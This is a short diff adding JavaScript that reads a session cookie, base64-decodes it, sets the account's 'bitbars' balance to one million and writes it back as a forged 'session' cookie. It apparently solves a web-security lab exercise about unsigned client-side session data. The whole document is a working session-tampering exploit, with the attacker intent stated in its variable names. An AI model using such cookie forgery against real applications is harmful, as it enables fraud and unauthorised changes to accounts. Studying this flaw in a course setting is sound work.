@@ -1,0 +1,8 @@
+var cookieName = document.cookie
+var regex = /[^=]+=/;
+var cookieValue = cookieName.replace(regex, '');
+var info = atob(cookieValue);
+var fakeuser = JSON.parse(info);
+fakeuser.account.bitbars = 1000000
+var attackerCookie = JSON.stringify(fakeuser);
+document.cookie = "session=".concat(btoa(attackerCookie));
